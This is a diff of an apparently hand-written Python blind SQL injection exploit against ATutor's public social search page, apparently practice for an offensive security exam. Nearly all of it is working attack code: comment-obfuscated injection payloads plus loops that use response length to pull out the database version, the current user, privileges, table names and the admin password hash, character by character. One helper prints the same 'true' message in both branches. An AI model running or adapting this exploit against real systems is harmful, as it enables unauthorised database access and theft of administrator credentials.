@@ -22,7 +22,39 @@ def searchFriends_blind(ip, sub_query, debug=False):
     if (content_length == 180):
         return True
     return False
- 
+def question(ip, sub_query, debug=False):
+    if(searchFriends_blind(ip,sub_query, debug)):
+        print(F"\n(+) Result of expression [{sub_query}] is true")
+    else:
+        print(F"\n(+) Result of expression [{sub_query}] is true")
+'''
+Realistically instead of a linear search we should use a binary search,
+but hey this isn't algorithm analysis.
+Note to self it might be practical to have something like that coded up when we do hackerone and oswe exam. Get length is a pretty common operation in exfiltration and reducing the amount of time it takes to search is .... better.
+'''
+def getLength(ip, sub_query, lowbound, upperbound):
+    for i in range(lowbound, upperbound):
+        query = F"select/**/length(({sub_query}))={i}"
+        if(searchFriends_blind(ip,query,debug=False)):
+            print(F"(+) Length of result from expression [{sub_query}]: {i}")
+            return i
+def getString(ip, sub_query, string_length):
+    s_exfil = ''
+    for i in range(1, string_length + 1):
+        for j in range(32, 126):
+            query = F"select/**/ascii(substring(({sub_query}),{i},1))={j}"
+            if(searchFriends_blind(ip, query, debug=False)):
+                s_exfil += chr(j)
+                sys.stdout.write(chr(j))
+                sys.stdout.flush()
+    print(F"(+) Exfiltrated string from expression [{sub_query}]: {s_exfil}")
+    return s_exfil
+
+'''
+Everything below here is just experimentation.
+The three most essential functions are above.
+We with them we can
+'''
 def extractDBVersion(ip):
     # injection_string = "test')/**/or/**/(select/**/if(1=1,(select/**/ascii(substring((select/**/version()),1,1))=53),1))"
     for i in range(1,20):
@@ -78,17 +110,8 @@ def getTableNames(ip, num_tables):
         table_names.append(table_name)
     print("(+) Exfiltrated tables", table_names)
     return table_names
-'''
-Realistically instead of a linear search we should use a binary search,
-but hey this isn't algorithm analysis.
-Note to self it might be practical to have something like that coded up when we do hackerone and oswe exam. Get length is a pretty common operation in exfiltration and reducing the amount of time it takes to search is .... better.
-'''
-def getLength(ip, sub_sub_query, lowbound, upperbound):
-    for i in range(lowbound, upperbound):
-        sub_query = F"select/**/length(({sub_sub_query}))={i}"
-        if(searchFriends_blind(ip,sub_query,debug=False)):
-            print(F"(+)Length of result from expression [{sub_sub_query}]: {i}")
-            return i
+
+
 def getAdminHashes(ip, user, hash_len):
     for i in range(1,hash_len + 1):
         for j in range(32, 126):
@@ -107,59 +130,6 @@ def getDbAdmins(ip, num_admins):
     pass
 
 '''
-'''
-# old shit
-def extractDBCurrentUserNameLengthOLD(ip):
-    # mysql usernames were increased from 16 to 32 in version 8.0
-    # its also worth mentioning that operating system user names can be longer depending on the OS, so 32 is a soft limit.
-    # ideally this value should be changed after determining the version of mysqlr
-    for i in range(0,32): 
-        injection_string = F"test%27)/**/or/**/(select/**/if(1=1,(select/**/length(user())>{i}),'a'))%23"
-        target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string}"
-        r = requests.get(target)
-        content_length = int(r.headers['Content-Length'])
-        if (content_length < 180):
-            print ("user name length is: ", i)
-            break
-def searchFriends_sqli(ip, inj_str):
-    for j in range(32, 126):
-        # now we update the sqli
-        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
-        print(target)
-        r = requests.get(target)
-        content_length = int(r.headers['Content-Length'])
-        if (content_length > 20):
-            return j
-    return None
-def extractDBVersionOld(ip):
-    print("(+) Retrieving database version....")
-    # 19 is length of the version() string. This can
-    # be dynamically stolen from the database as well!
-    for i in range(1, 20):
-        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
-        extracted_char = chr(searchFriends_sqli(ip, injection_string))
-        sys.stdout.write(extracted_char)
-        sys.stdout.flush()
-    print("\n(+) done!")
-
-
-def extractDBUser(ip):
-    print("(+) Retrieving database current user....")
-    for i in range(1, 16):
-        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i
-        extracted_char = chr(searchFriends_sqli(ip, injection_string))
-        sys.stdout.write(extracted_char)
-        sys.stdout.flush()
-    print("\n(+) done!")
-def extractDBUserPrivs(ip):
-    print("(+) Retrieving database user privs....")
-    for i in range(1,1000):
-        injection_string = "test')/**/or/**/(ascii(substring((show/**/grants/**/for/**/user()),%d,1)))=[CHAR]%%23" % i
-        extracted_char = chr(searchFriends_sqli(ip, injection_string))
-        sys.stdout.write(extracted_char)
-        sys.stdout.flush()
-    print("\n(+) done!")
-'''
 def main():
     if len(sys.argv) != 2:
         print("(+) usage: %s <target>"  % sys.argv[0])
@@ -167,14 +137,30 @@ def main():
         sys.exit(-1)
 
     ip = sys.argv[1]
+    
+    db_version_query = "select/**/version()"
+    current_user_query = "current_user()"
+    admin_hash_query = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
+
+    #temp = getLength(ip,db_version_query,1,20)
+    #getString(ip,db_version_query, temp )
+
+    temp = getLength(ip,current_user_query, 1, 20)
+    username = getString(ip,current_user_query, temp)
+
+    current_user_is_dbadmin_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
+    question(ip, current_user_is_dbadmin_query)
+    #admin_hash_length = getLength(ip,admin_hash_query, 1, 100)
+    #admin_hash = getString(ip, admin_hash_query, admin_hash_length)
+    #sub_query = "(select/**/password/**/from/**/AT_admins/**/where login='admin'"
+
+    # old
     #extractDBVersion(ip)
     #username_length = extractCurrentUserNameLength(ip)
     #extractCurrentUsername(ip,username_length)
     #currentUserIsDbAdmin(ip,'root@localhost')
     #num_tables = getNumberOfTables(ip,0,250)
     #getTableNames(ip, num_tables)
-    admin_hash = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
-    getLength(ip,admin_hash, 1, 100)
     
 if __name__ == "__main__":
     main()
